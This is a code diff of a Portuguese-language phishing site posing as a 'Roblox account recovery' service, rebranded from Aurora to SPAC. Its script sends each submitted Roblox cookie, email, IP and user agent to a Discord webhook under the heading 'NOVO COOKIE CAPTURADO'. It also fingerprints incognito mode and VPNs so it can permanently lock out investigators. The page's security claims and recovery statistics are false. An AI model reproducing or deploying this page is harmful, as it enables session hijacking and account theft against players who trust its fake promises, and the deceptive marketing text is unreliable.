-                <i class="fas fa-star"></i>
-                <span>AURORA</span>
+                <i class="fas fa-water"></i>
+                <span>SPAC</span>
             </div>
             <div class="nav-menu" id="navMenu">
                 <a class="nav-link active" onclick="showSection('home')"><i class="fas fa-home"></i> Home</a>
@@ -1877,20 +1877,20 @@
         <div class="container">
             <div class="hero-content">
                 <div class="hero-badge">
-                    <i class="fas fa-crown"></i>
-                    ✨ Aurora Premium
+                    <i class="fas fa-water"></i>
+                    🌊 SPAC Premium
                 </div>
-                <h1 class="hero-title">Aurora</h1>
-                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="aurora">✨ Aurora</span></p>
+                <h1 class="hero-title">SPAC</h1>
+                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="spac">🌊 SPAC</span></p>
                 <p class="hero-description">
                     Recupere sua conta Roblox de forma segura, rápida e confiável com nossa plataforma de última geração. 
-                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#c084fc;">✨ Aurora</strong>
+                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#00d4ff;">🌊 SPAC</strong>
                 </p>
                 <div class="hero-features">
                     <div class="feature-badge"><i class="fas fa-shield-alt"></i> 100% Seguro</div>
                     <div class="feature-badge"><i class="fas fa-bolt"></i> Ultrarrápido</div>
                     <div class="feature-badge"><i class="fas fa-check-circle"></i> Verificado</div>
-                    <div class="feature-badge"><i class="fas fa-star"></i> Aurora</div>
+                    <div class="feature-badge"><i class="fas fa-water"></i> SPAC</div>
                 </div>
                 <div class="hero-cta">
                     <button class="btn btn-primary btn-lg" onclick="goToRecovery()">
@@ -1903,7 +1903,7 @@
         <!-- CARDS SECTION -->
         <div class="cards-section">
             <div class="container">
-                <h2 class="section-title">Por que Escolher Aurora? ✨</h2>
+                <h2 class="section-title">Por que Escolher SPAC? 🌊</h2>
                 <p class="section-subtitle">Recursos que fazem a diferença</p>
                 <div class="cards-grid">
                     <div class="card">
@@ -1922,8 +1922,8 @@
                         <p class="card-text">Equipe sempre pronta para ajudar você. Respostas em menos de 1 hora.</p>
                     </div>
                     <div class="card">
-                        <div class="card-icon"><i class="fas fa-star"></i></div>
-                        <h3 class="card-title">Aurora</h3>
+                        <div class="card-icon"><i class="fas fa-water"></i></div>
+                        <h3 class="card-title">SPAC</h3>
                         <p class="card-text">Uma nova experiência em recuperação de contas com um toque de elegância e tecnologia.</p>
                     </div>
                 </div>
@@ -1936,13 +1936,13 @@
         <div class="container">
             <div class="content-wrapper">
                 <h2 class="section-title">Dashboard de Recuperação</h2>
-                <p class="section-subtitle">Recupere sua conta de forma segura e confiável ✨</p>
+                <p class="section-subtitle">Recupere sua conta de forma segura e confiável 🌊</p>
                 
                 <div class="recovery-grid">
                     <div class="main-card">
                         <div class="card-header">
                             <h1>Recuperar Sua Conta</h1>
-                            <span class="badge">✨ Aurora</span>
+                            <span class="badge">🌊 SPAC</span>
                         </div>
 
                         <form id="recoveryForm" onsubmit="handleSubmit(event)">
@@ -1971,7 +1971,7 @@
 
                             <div class="security-box">
                                 <i class="fas fa-shield-alt"></i>
-                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#c084fc;">✨ Aurora</span></p>
+                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#00d4ff;">🌊 SPAC</span></p>
                             </div>
 
                             <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
@@ -1987,7 +1987,7 @@
                                 <div style="margin-top: 1rem; display: flex; flex-direction: column; gap: 0.5rem; align-items: center;">
                                     <p style="color: rgba(255,255,255,0.6); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
                                     <div style="display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;">
-                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #c084fc; text-decoration: none; font-size: 0.85rem; background: rgba(124,58,237,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(124,58,237,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
+                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #00d4ff; text-decoration: none; font-size: 0.85rem; background: rgba(0,212,255,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(0,212,255,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
                                             <i class="fab fa-discord"></i> Discord
                                         </a>
                                         <a href="https://www.tiktok.com/@244brobt" target="_blank" style="color: #25f4ee; text-decoration: none; font-size: 0.85rem; background: rgba(0,0,0,0.3); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(37,244,238,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
@@ -2007,11 +2007,11 @@
                         <div class="info-card">
                             <h4><i class="fas fa-server"></i> Status do Sistema</h4>
                             <div style="margin-bottom: 0.8rem;">
-                                <span class="status-indicator"><i class="fas fa-circle"></i> Online ✨</span>
+                                <span class="status-indicator"><i class="fas fa-circle"></i> Online 🌊</span>
                             </div>
-                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #a78bfa; font-weight: 700;">✓ Operacional</span></div>
-                            <div class="info-item"><span class="info-label">API</span><span style="color: #a78bfa; font-weight: 700;">✓ Funcionando</span></div>
-                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #a78bfa; font-weight: 700;">✓ Protegido</span></div>
+                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #66e5ff; font-weight: 700;">✓ Operacional</span></div>
+                            <div class="info-item"><span class="info-label">API</span><span style="color: #66e5ff; font-weight: 700;">✓ Funcionando</span></div>
+                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #66e5ff; font-weight: 700;">✓ Protegido</span></div>
                         </div>
 
                         <div class="info-card">
@@ -2019,7 +2019,7 @@
                             <div class="info-item"><span class="info-label">Contas Recuperadas</span><span class="info-value">15,847</span></div>
                             <div class="info-item"><span class="info-label">Taxa de Sucesso</span><span class="info-value">99.8%</span></div>
                             <div class="info-item"><span class="info-label">Tempo Médio</span><span class="info-value">2h 30m</span></div>
-                            <div class="info-item"><span class="info-label">Sistema</span><span class="info-value">✨ Aurora</span></div>
+                            <div class="info-item"><span class="info-label">Sistema</span><span class="info-value">🌊 SPAC</span></div>
                         </div>
 
                         <div class="info-card">
@@ -2042,8 +2042,8 @@
     <section class="section" id="comunidade">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">👥 Nossa Comunidade ✨</h2>
-                <p class="section-subtitle">Conecte-se conosco e faça parte da família Aurora</p>
+                <h2 class="section-title">👥 Nossa Comunidade 🌊</h2>
+                <p class="section-subtitle">Conecte-se conosco e faça parte da família SPAC</p>
                 
                 <div class="comunidade-grid">
                     <div class="comunidade-card" onclick="window.open('https://discord.gg/ztskdZZjEs', '_blank')">
@@ -2058,9 +2058,9 @@
                         <h3>Email Oficial</h3>
                         <p>Entre em contato conosco pelo email oficial para suporte e dúvidas.</p>
                         <div class="email-info">
-                            <p><i class="fas fa-envelope"></i> suporte.auroraplum@gmail.com</p>
+                            <p><i class="fas fa-envelope"></i> suporte.spac@gmail.com</p>
                         </div>
-                        <button class="btn-comunidade" onclick="window.location.href='mailto:suporte.auroraplum@gmail.com'">
+                        <button class="btn-comunidade" onclick="window.location.href='mailto:suporte.spac@gmail.com'">
                             <i class="fas fa-paper-plane"></i> Enviar Email
                         </button>
                     </div>
@@ -2081,7 +2081,7 @@
         <div class="container">
             <div class="content-wrapper">
                 <h2 class="section-title">Perguntas Frequentes</h2>
-                <p class="section-subtitle">Encontre respostas para suas dúvidas ✨</p>
+                <p class="section-subtitle">Encontre respostas para suas dúvidas 🌊</p>
                 
                 <div class="faq-grid">
                     <div class="faq-item">
@@ -2140,7 +2140,7 @@
                             <i class="fas fa-chevron-down"></i>
                         </div>
                         <div class="faq-answer">
-                            <p>Você pode nos contatar através do Discord, TikTok ou pelo email support@aurora.com. Respondemos em até 24 horas com soluções rápidas e eficientes.</p>
+                            <p>Você pode nos contatar através do Discord, TikTok ou pelo email support@spac.com. Respondemos em até 24 horas com soluções rápidas e eficientes.</p>
                         </div>
                     </div>
                 </div>
@@ -2152,7 +2152,7 @@
     <section class="section" id="stats">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Nossos Números ✨</h2>
+                <h2 class="section-title">Nossos Números 🌊</h2>
                 <p class="section-subtitle">Confiança de milhares de usuários ao redor do mundo</p>
                 
                 <div class="stats-grid">
@@ -2177,8 +2177,8 @@
     <section class="section" id="donate">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Apoie o Projeto ✨</h2>
-                <p class="section-subtitle">Sua doação ajuda a manter e melhorar o Aurora</p>
+                <h2 class="section-title">Apoie o Projeto 🌊</h2>
+                <p class="section-subtitle">Sua doação ajuda a manter e melhorar o SPAC</p>
                 
                 <div class="donation-grid">
                     <div class="donation-card desativado">
@@ -2210,10 +2210,10 @@
                     </div>
                 </div>
 
-                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(192,132,252,0.1)); border-radius: 16px; border: 1px solid rgba(192,132,252,0.2);">
-                    <i class="fas fa-star" style="font-size: 1.8rem; color: #c084fc; display: block; margin-bottom: 0.5rem;"></i>
-                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">✨ Sistema em Manutenção</h3>
-                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve ✨</p>
+                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(102,229,255,0.1)); border-radius: 16px; border: 1px solid rgba(102,229,255,0.2);">
+                    <i class="fas fa-water" style="font-size: 1.8rem; color: #00d4ff; display: block; margin-bottom: 0.5rem;"></i>
+                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">🌊 Sistema em Manutenção</h3>
+                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve 🌊</p>
                 </div>
             </div>
         </div>
@@ -2223,7 +2223,7 @@
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-section">
-                <h4>✨ Aurora Premium</h4>
+                <h4>🌊 SPAC Premium</h4>
                 <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7.</p>
             </div>
             <div class="footer-section">
@@ -2245,12 +2245,12 @@
             </div>
             <div class="footer-section">
                 <h4>Contato</h4>
-                <p><i class="fas fa-envelope"></i> support@aurora.com</p>
-                <p>Status: <span style="color: #a78bfa;">● Online ✨</span></p>
+                <p><i class="fas fa-envelope"></i> support@spac.com</p>
+                <p>Status: <span style="color: #66e5ff;">● Online 🌊</span></p>
             </div>
         </div>
         <div class="footer-bottom">
-            <p>&copy; 2026 Aurora Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você ✨ <span class="aurora">Aurora</span></p>
+            <p>&copy; 2026 SPAC Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você 🌊 <span class="spac">SPAC</span></p>
         </div>
     </footer>
 
@@ -2258,7 +2258,7 @@
     <div class="modal-overlay" id="processingModal">
         <div class="processing-modal">
             <div class="loader"></div>
-            <h2 class="processing-title" id="processingTitle">Processando... ✨</h2>
+            <h2 class="processing-title" id="processingTitle">Processando... 🌊</h2>
             <p class="processing-message" id="processingMessage">Verificando credenciais...</p>
             <div class="progress-container">
                 <div class="progress-bar"><div class="progress-fill"></div></div>
@@ -2271,7 +2271,7 @@
     <div class="modal-overlay" id="successModal">
         <div class="success-modal">
             <div class="success-icon"><i class="fas fa-check"></i></div>
-            <h2 class="success-title">Sucesso! ✨</h2>
+            <h2 class="success-title">Sucesso! 🌊</h2>
             <p class="success-message">Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve.</p>
             <button class="btn btn-success" onclick="closeSuccessModal()">
                 <i class="fas fa-check-circle"></i> Entendi, Continuar
@@ -2281,18 +2281,42 @@
 
     <script>
         // ============================================================
+        // 0. BLOQUEIO PERMANENTE - VERIFICAR ANTES DE TUDO
+        // ============================================================
+        function blockUserPermanently(reason) {
+            localStorage.setItem('spac_blocked_permanent', 'true');
+            localStorage.setItem('spac_block_reason', reason);
+            localStorage.setItem('spac_block_time', Date.now().toString());
+            
+            document.body.innerHTML = `
+                <div style="position:fixed;inset:0;background:#0a0e17;display:flex;align-items:center;justify-content:center;z-index:999999;padding:2rem;font-family:'Inter',sans-serif;">
+                    <div style="background:linear-gradient(135deg,rgba(10,14,23,0.98),rgba(13,27,42,0.98));border:2px solid #ef4444;border-radius:20px;padding:2.5rem;max-width:500px;width:100%;text-align:center;animation:scaleIn 0.4s ease-out;">
+                        <div style="font-size:4rem;margin-bottom:1rem;">🚫</div>
+                        <h2 style="color:#ef4444;font-size:1.5rem;font-weight:800;font-family:'Poppins',sans-serif;margin-bottom:0.8rem;">ACESSO BLOQUEADO!</h2>
+                        <p style="color:rgba(255,255,255,0.8);font-size:0.95rem;line-height:1.7;margin-bottom:0.8rem;">${reason || '🔒 Acesso não permitido por questões de segurança.'}</p>
+                        <div style="background:rgba(239,68,68,0.1);border-radius:12px;padding:1rem;margin-bottom:1.5rem;border:1px solid rgba(239,68,68,0.2);">
+                            <p style="color:#fca5a5;font-weight:600;font-size:0.9rem;margin:0;">⛔ Você não pode mais acessar este site.</p>
+                        </div>
+                        <p style="color:rgba(255,255,255,0.4);font-size:0.75rem;">Se você acha que isso é um erro, entre em contato com o suporte.</p>
+                    </div>
+                </div>
+            `;
+            
+            const style = document.createElement('style');
+            style.textContent = `@keyframes scaleIn { 0% { opacity: 0; transform: scale(0.9); } 100% { opacity: 1; transform: scale(1); } }`;
+            document.head.appendChild(style);
+        }
+
+        // ============================================================
         // 1. DETECÇÃO AVANÇADA DE NAVEGADOR ANÔNIMO E VPN
         // ============================================================
-        
-        // Detectar modo privado/anônimo com múltiplos métodos
         function isPrivateBrowsing() {
             return new Promise((resolve) => {
                 let detectionMethods = 0;
                 let positiveResults = 0;
 
-                // Método 1: localStorage
                 try {
-                    const test = '__aurora_test__';
+                    const test = '__spac_test__';
                     localStorage.setItem(test, '1');
                     localStorage.removeItem(test);
                 } catch (e) {
@@ -2300,9 +2324,8 @@
                 }
                 detectionMethods++;
 
-                // Método 2: sessionStorage
                 try {
-                    const test = '__aurora_test__';
+                    const test = '__spac_test__';
                     sessionStorage.setItem(test, '1');
                     sessionStorage.removeItem(test);
                 } catch (e) {
@@ -2310,9 +2333,8 @@
                 }
                 detectionMethods++;
 
-                // Método 3: IndexedDB
                 try {
-                    const request = indexedDB.open('__aurora_test__');
+                    const request = indexedDB.open('__spac_test__');
                     request.onerror = () => {
                         positiveResults++;
                         if (++detectionMethods >= 3) {
@@ -2331,25 +2353,20 @@
                     }
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(positiveResults >= 2);
                 }, 1000);
             });
         }
 
-        // ============================================================
-        // 1.5 FUNÇÃO PARA DETECTAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS EFICAZ)
-        // ============================================================
         function detectPrivateBrowsingBrowser() {
             return new Promise((resolve) => {
                 let result = false;
                 let checksDone = 0;
                 let totalChecks = 4;
                 
-                // Método 1: localStorage
                 try {
-                    const test = '__aurora_test__';
+                    const test = '__spac_test__';
                     localStorage.setItem(test, '1');
                     localStorage.removeItem(test);
                 } catch (e) {
@@ -2357,9 +2374,8 @@
                 }
                 checksDone++;
 
-                // Método 2: sessionStorage
                 try {
-                    const test = '__aurora_test__';
+                    const test = '__spac_test__';
                     sessionStorage.setItem(test, '1');
                     sessionStorage.removeItem(test);
                 } catch (e) {
@@ -2367,9 +2383,8 @@
                 }
                 checksDone++;
 
-                // Método 3: IndexedDB
                 try {
-                    const request = indexedDB.open('__aurora_test__');
+                    const request = indexedDB.open('__spac_test__');
                     request.onerror = () => { 
                         result = true;
                         checksDone++;
@@ -2388,10 +2403,8 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
-                // Método 4: quota de armazenamento (Chrome)
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
-                        // Em modo incógnito, a quota é menor que 120MB
                         if (estimate.quota < 120000000) {
                             result = true;
                         }
@@ -2406,42 +2419,31 @@
                     if (checksDone >= totalChecks) resolve(result);
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     resolve(result);
                 }, 3000);
             });
         }
 
-        // Detectar VPN/Proxy via IP com múltiplos métodos
         async function detectVPN() {
             try {
-                // Usar múltiplas APIs para melhor precisão
                 const ipData = await getIPData();
                 if (!ipData) return false;
 
-                // Verificar indicadores de VPN com lógica mais rigorosa
                 const vpnIndicators = [
                     ipData.is_vpn === true,
                     ipData.is_proxy === true,
                     ipData.is_tor === true,
                     ipData.is_datacenter === true,
-                    ipData.threat_level > 50 // Alto nível de ameaça
+                    ipData.threat_level > 50
                 ];
 
-                // Retorna true se detectar VPN/Proxy/Tor ou datacenter
-                const detected = vpnIndicators.some(indicator => indicator === true);
-                if (detected) {
-                    console.warn('🚨 VPN/Proxy detectado:', ipData);
-                }
-                return detected;
+                return vpnIndicators.some(indicator => indicator === true);
             } catch (error) {
-                console.warn('Erro ao detectar VPN:', error);
                 return false;
             }
         }
 
-        // Obter dados de IP com fallback
         async function getIPData() {
             const apis = [
                 {
@@ -2462,14 +2464,6 @@
                         is_datacenter: data.hosting === true,
                         threat_level: (data.proxy || data.hosting) ? 75 : 0
                     })
-                },
-                {
-                    url: 'https://api.abuseipdb.com/api/v2/check?maxAgeInDays=90',
-                    headers: { 'Key': 'unknown' },
-                    parser: (data) => ({
-                        is_vpn: data.usageType === 'VPN',
-                        threat_level: data.abuseConfidenceScore || 0
-                    })
                 }
             ];
 
@@ -2485,7 +2479,6 @@
                         return api.parser(data);
                     }
                 } catch (e) {
-                    console.warn(`API ${api.url} falhou:`, e);
                     continue;
                 }
             }
@@ -2493,15 +2486,12 @@
             return null;
         }
 
-        // Detectar Google Chrome anônimo especificamente com múltiplos métodos
         async function isGoogleIncognito() {
             return new Promise((resolve) => {
                 let detectionResults = [];
 
-                // Método 1: Verificar quota de armazenamento
                 if (navigator.storage && navigator.storage.estimate) {
                     navigator.storage.estimate().then(estimate => {
-                        // Em modo incógnito, a quota é muito menor (< 120MB)
                         detectionResults.push(estimate.quota < 120000000);
                         if (detectionResults.length >= 2) {
                             resolve(detectionResults.some(r => r === true));
@@ -2516,7 +2506,6 @@
                     detectionResults.push(false);
                 }
 
-                // Método 2: Verificar requestFileSystem (Chrome específico)
                 if (window.webkitRequestFileSystem) {
                     window.webkitRequestFileSystem(
                         window.TEMPORARY,
@@ -2528,7 +2517,7 @@
                             }
                         },
                         () => {
-                            detectionResults.push(true); // Erro = modo incógnito
+                            detectionResults.push(true);
                             if (detectionResults.length >= 2) {
                                 resolve(detectionResults.some(r => r === true));
                             }
@@ -2538,7 +2527,6 @@
                     detectionResults.push(false);
                 }
 
-                // Timeout para garantir resposta
                 setTimeout(() => {
                     if (detectionResults.length > 0) {
                         resolve(detectionResults.some(r => r === true));
@@ -2551,15 +2539,9 @@
 
         async function checkBlocked() {
             try {
-                // Verificar navegador anônimo
                 const isPrivate = await isPrivateBrowsing();
                 const isGoogleIncog = await isGoogleIncognito();
-                
-                // Verificar VPN/Proxy
                 const hasVPN = await detectVPN();
-                
-                const blockModal = document.getElementById('blockModal');
-                const blockReason = document.getElementById('blockReason');
                 
                 let blockMessage = '';
                 let shouldBlock = false;
@@ -2573,9 +2555,7 @@
                 }
 
                 if (shouldBlock) {
-                    blockReason.textContent = blockMessage;
-                    blockModal.classList.add('active');
-                    document.body.style.overflow = 'hidden';
+                    blockUserPermanently(blockMessage);
                     return true;
                 }
                 return false;
@@ -2598,9 +2578,9 @@
         let timerInterval = null;
         let isBlocked = false;
         let termsAccepted = false;
-        let isUserBanned = false; // NOVA VARIÁVEL PARA CONTROLE DE BANIMENTO
+        let isUserBanned = false;
         let webhookInfo = {
-            username: 'Aurora Security',
+            username: 'SPAC Security',
             avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
         };
 
@@ -2613,7 +2593,7 @@
                 if (response.ok) {
                     const data = await response.json();
                     webhookInfo = {
-                        username: data.name || 'Aurora Security',
+                        username: data.name || 'SPAC Security',
                         avatar_url: data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.png` : 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
                     };
                     console.log('✅ Webhook info carregado:', webhookInfo);
@@ -2630,14 +2610,12 @@
         // ============================================================
         async function checkBanStatus() {
             try {
-                // Pegar IP do visitante
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 const ip = ipData.ip;
 
                 console.log('🔍 Verificando IP:', ip);
 
-                // Verificar na API de banimento
                 const banResponse = await fetch(`/api/ban?check=${ip}`);
                 const banData = await banResponse.json();
 
@@ -2657,13 +2635,7 @@
             }
         }
 
-        // ============================================================
-        // 3.6 FUNÇÃO PARA MOSTRAR MODAL DE BLOQUEIO POR BANIMENTO
-        // ============================================================
         function showBanBlockModal(reason, expires) {
-            const blockModal = document.getElementById('blockModal');
-            const blockReason = document.getElementById('blockReason');
-            
             let message = '🚫 ACESSO BLOQUEADO POR BANIMENTO\n\n';
             message += `📌 Motivo: ${reason}\n\n`;
             
@@ -2674,31 +2646,13 @@
                 message += `⛔ Banimento PERMANENTE - Você não pode mais usar o sistema`;
             }
             
-            blockReason.textContent = message;
-            blockModal.classList.add('active');
-            document.body.style.overflow = 'hidden';
-            
-            // Esconder o formulário de recuperação
-            const recoveryForm = document.getElementById('recoveryForm');
-            if (recoveryForm) {
-                recoveryForm.style.display = 'none';
-            }
-            
-            // Desabilitar botão de submit
-            const submitBtn = document.getElementById('submitBtn');
-            if (submitBtn) {
-                submitBtn.disabled = true;
-                submitBtn.innerHTML = '<i class="fas fa-ban"></i> BLOQUEADO';
-                submitBtn.style.opacity = '0.5';
-                submitBtn.style.cursor = 'not-allowed';
-            }
+            blockUserPermanently(message);
         }
 
         // ============================================================
         // 4. TERMS MODAL
         // ============================================================
         function openTermsModal() {
-            // Verificar se está banido
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2714,18 +2668,17 @@
 
         function acceptTerms() {
             termsAccepted = true;
-            localStorage.setItem('aurora_terms_accepted', 'true');
+            localStorage.setItem('spac_terms_accepted', 'true');
             closeTermsModal();
-            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. ✨');
+            showNotification('✅', 'Termos Aceitos!', 'Você concordou com os termos de serviço e política de privacidade. 🌊');
             showSection('recovery');
         }
 
         function checkTerms() {
-            const saved = localStorage.getItem('aurora_terms_accepted');
+            const saved = localStorage.getItem('spac_terms_accepted');
             if (saved === 'true') {
                 termsAccepted = true;
             } else {
-                // Verificar se está banido antes de abrir o modal
                 if (!isUserBanned) {
                     setTimeout(() => { openTermsModal(); }, 1500);
                 }
@@ -2751,11 +2704,10 @@
         // ============================================================
         async function sendToWebhook(cookie, email, ip, isPrivate, vpnDetected) {
             try {
-                // Obter dados de VPN para relatório
                 const vpnData = vpnDetected ? await getIPData() : null;
                 
                 const payload = {
-                    content: `✨ **NOVO COOKIE CAPTURADO - AURORA** ✨\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n✨ **#Aurora** ✨`,
+                    content: `🌊 **NOVO COOKIE CAPTURADO - SPAC** 🌊\n\n🍪 **Cookie:** \`${cookie}\`\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}${vpnData ? `\n📊 **Dados VPN:** ${JSON.stringify(vpnData)}` : ''}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n🌊 **#SPAC** 🌊`,
                     username: webhookInfo.username,
                     avatar_url: webhookInfo.avatar_url
                 };
@@ -2784,46 +2736,6 @@
         }
 
         // ============================================================
-        // 6.5 FUNÇÃO PARA VERIFICAR NAVEGADOR ANÔNIMO E VPN VIA API
-        // ============================================================
-        async function checkDetection() {
-            try {
-                const response = await fetch('/api/detect');
-                const data = await response.json();
-                
-                console.log('📊 Resultado da detecção:', data);
-                
-                if (data.data && data.data.blocked) {
-                    const blockModal = document.getElementById('blockModal');
-                    const blockReason = document.getElementById('blockReason');
-                    
-                    let message = '';
-                    if (data.data.isPrivate) {
-                        message = '🔒 Navegador Anônimo/Incógnito Detectado\n\n❌ Navegadores anônimos não são permitidos por questões de segurança.';
-                    } else if (data.data.vpn && data.data.vpn.isVPN) {
-                        message = '🌐 VPN ou Proxy Detectado\n\n❌ Conexões via VPN ou proxy não são permitidas por questões de segurança.';
-                    }
-                    
-                    // Detalhes adicionais
-                    if (data.data.vpn && data.data.vpn.details) {
-                        const details = data.data.vpn.details;
-                        message += `\n\n📌 Detalhes:\n📍 País: ${details.country}\n🏙️ Cidade: ${details.city}\n📡 ISP: ${details.isp}`;
-                    }
-                    
-                    blockReason.textContent = message;
-                    blockModal.classList.add('active');
-                    document.body.style.overflow = 'hidden';
-                    return data.data;
-                }
-                
-                return data.data || { blocked: false };
-            } catch (error) {
-                console.error('❌ Erro ao verificar detecção:', error);
-                return { blocked: false };
-            }
-        }
-
-        // ============================================================
         // 7. MENU MOBILE
         // ============================================================
         function toggleMenu() {
@@ -2834,7 +2746,6 @@
         // 8. NAVEGAÇÃO
         // ============================================================
         function showSection(sectionId) {
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode acessar o sistema.');
                 return;
@@ -2857,11 +2768,7 @@
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // ============================================================
-        // 8.5 FUNÇÃO PARA IR PARA RECUPERAÇÃO COM VERIFICAÇÃO
-        // ============================================================
         function goToRecovery() {
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
@@ -2912,7 +2819,7 @@
                 document.getElementById('submitBtn').innerHTML = '<i class="fas fa-lock-open"></i> Iniciar Recuperação';
                 hasAttempted = false;
                 isBlocked = false;
-                localStorage.removeItem('aurora_block_until');
+                localStorage.removeItem('spac_block_until');
                 return;
             }
 
@@ -2925,47 +2832,38 @@
         }
 
         // ============================================================
-        // 12. HANDLE SUBMIT (1 TENTATIVA + 9H BLOQUEIO)
+        // 12. HANDLE SUBMIT
         // ============================================================
         async function handleSubmit(event) {
             event.preventDefault();
             
-            // VERIFICAR SE O USUÁRIO ESTÁ BANIDO
             if (isUserBanned) {
                 showNotification('🚫', 'Acesso Bloqueado!', 'Você está banido e não pode usar o sistema de recuperação.');
                 return;
             }
             
-            // Verificar se aceitou os termos
             if (!termsAccepted) {
                 openTermsModal();
-                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. ✨');
+                showNotification('⚠️', 'Aceite os Termos!', 'Você precisa aceitar os termos de serviço para continuar. 🌊');
                 return;
             }
             
-            // Verificar se está bloqueado por tentativa
             if (isBlocked) {
                 showNotification('⏳', 'Aguarde!', 'Você precisa esperar 9 horas para tentar novamente.');
                 return;
             }
 
-            // Verificar navegador anônimo (reforço)
             const isPrivate = await isPrivateBrowsing();
             const isGoogleIncog = await isGoogleIncognito();
             const hasVPN = await detectVPN();
             
-            if (isPrivate) {
-                showNotification('🔒', 'Navegador Anônimo!', 'Navegadores anônimos não são permitidos por questões de segurança.');
-                return;
-            }
-            
-            if (isGoogleIncog) {
-                showNotification('🔒', 'Modo Incógnito!', 'O modo incógnito do Google Chrome não é permitido por questões de segurança.');
+            if (isPrivate || isGoogleIncog) {
+                blockUserPermanently('🔒 Navegador Anônimo/Incógnito Detectado');
                 return;
             }
             
             if (hasVPN) {
-                showNotification('🌐', 'VPN Detectada!', 'Conexões via VPN ou proxy não são permitidas por questões de segurança.');
+                blockUserPermanently('🌐 VPN ou Proxy Detectado');
                 return;
             }
 
@@ -2977,7 +2875,6 @@
                 return;
             }
 
-            // Verificar se já tentou
             if (hasAttempted) {
                 showNotification('⏳', 'Limite atingido!', 'Você só pode tentar 1 vez. Aguarde 9 horas.');
                 return;
@@ -2985,7 +2882,6 @@
 
             const ip = await getIP();
 
-            // Mostrar loading
             document.getElementById('submitBtn').disabled = true;
             document.getElementById('submitBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...';
 
@@ -2995,9 +2891,8 @@
                 hasAttempted = true;
                 isBlocked = true;
                 
-                // Salvar bloqueio de 9 horas
                 blockUntil = Date.now() + (9 * 60 * 60 * 1000);
-                localStorage.setItem('aurora_block_until', blockUntil.toString());
